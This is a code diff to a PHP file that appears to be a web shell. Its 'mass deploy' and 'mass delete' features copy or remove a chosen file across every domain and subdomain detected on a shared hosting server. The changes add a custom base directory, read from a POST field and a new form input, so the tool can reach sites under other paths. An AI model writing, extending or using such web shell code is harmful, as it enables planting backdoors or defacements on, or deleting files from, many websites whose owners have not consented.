@@ -67,7 +67,6 @@ function RBPautoDetectBaseDir() {
         '/home/*/www',
         '/home/*/web',
         '/home/*/*/public_html'
-        '/home/*/
     ];
     
     $currentUser = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown';
@@ -566,6 +565,11 @@ if (isset($_POST['mass_deploy'])) {
     $isPostAction = true;
     $sourceFile = $_POST['deploy_file_path'] ?? '';
     
+    // Check if custom base directory is provided
+    if (isset($_POST['custom_base_dir']) && !empty($_POST['custom_base_dir'])) {
+        $baseDir = $_POST['custom_base_dir'];
+    }
+    
     if (empty($sourceFile) || !file_exists($sourceFile)) {
         $_SESSION['mass_deploy_results'] = ["error" => "Source file not found: $sourceFile"];
         header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
@@ -584,6 +588,12 @@ if (isset($_POST['mass_deploy'])) {
 if (isset($_POST['mass_delete'])) {
     $isPostAction = true;
     $sourceFile = $_POST['deploy_file_path'] ?? '';
+    
+    // Check if custom base directory is provided
+    if (isset($_POST['custom_base_dir']) && !empty($_POST['custom_base_dir'])) {
+        $baseDir = $_POST['custom_base_dir'];
+    }
+    
     $filename = basename($sourceFile);
     
     $results = RBPmassDelete($baseDir, $filename);
@@ -1184,6 +1194,14 @@ if (isset($_SESSION['download_result'])) {
             padding: 20px;
             margin: 15px 0;
         }
+        
+        .custom-dir-input {
+            margin: 10px 0;
+            padding: 10px;
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 5px;
+        }
     </style>
 </head>
 <body>
@@ -1389,15 +1407,24 @@ if (isset($_SESSION['download_result'])) {
                     <p>Auto-detected base directory: <?php echo htmlspecialchars($baseDir); ?></p>
                     <?php
                     $domains = RBPgetAllSubdomains($baseDir);
-                    foreach ($domains as $domain) {
-                        echo '<div class="domain-item">' . htmlspecialchars($domain['name']) . ' -> ' . htmlspecialchars($domain['path']) . '</div>';
-                    }
                     if (count($domains) === 0) {
                         echo '<p style="color: red;">No domains found in base directory!</p>';
                     } else {
                         echo '<p style="color: lime;">Found ' . count($domains) . ' domains/subdomains</p>';
+                        foreach ($domains as $domain) {
+                            echo '<div class="domain-item">' . htmlspecialchars($domain['name']) . ' -> ' . htmlspecialchars($domain['path']) . '</div>';
+                        }
                     }
                     ?>
+                </div>
+                
+                <!-- Custom Directory Input -->
+                <div class="custom-dir-input">
+                    <p><strong>Custom Base Directory (if domains not detected):</strong></p>
+                    <input type="text" id="custom_base_dir" placeholder="/home/username/domains" value="<?php echo htmlspecialchars($baseDir); ?>" style="width: 100%; padding: 8px; background: #2a2a2a; border: 1px solid #444; border-radius: 3px; color: #fff;">
+                    <p style="color: #aaa; font-size: 11px; margin-top: 5px;">
+                        Common paths: /home/*/domains, /var/www, /home/*/public_html
+                    </p>
                 </div>
                 
                 <p><strong>Select File to Deploy:</strong></p>
@@ -1621,6 +1648,13 @@ if (isset($_SESSION['download_result'])) {
             var input2 = document.createElement("input");
             input2.name = "mass_deploy";
             input2.value = "1";
+            var customBaseDir = document.getElementById('custom_base_dir').value;
+            if (customBaseDir && customBaseDir.trim() !== '') {
+                var input3 = document.createElement("input");
+                input3.name = "custom_base_dir";
+                input3.value = customBaseDir;
+                form.appendChild(input3);
+            }
             form.appendChild(input1);
             form.appendChild(input2);
             document.body.appendChild(form);
@@ -1637,6 +1671,13 @@ if (isset($_SESSION['download_result'])) {
             var input2 = document.createElement("input");
             input2.name = "mass_delete";
             input2.value = "1";
+            var customBaseDir = document.getElementById('custom_base_dir').value;
+            if (customBaseDir && customBaseDir.trim() !== '') {
+                var input3 = document.createElement("input");
+                input3.name = "custom_base_dir";
+                input3.value = customBaseDir;
+                form.appendChild(input3);
+            }
             form.appendChild(input1);
             form.appendChild(input2);
             document.body.appendChild(form);
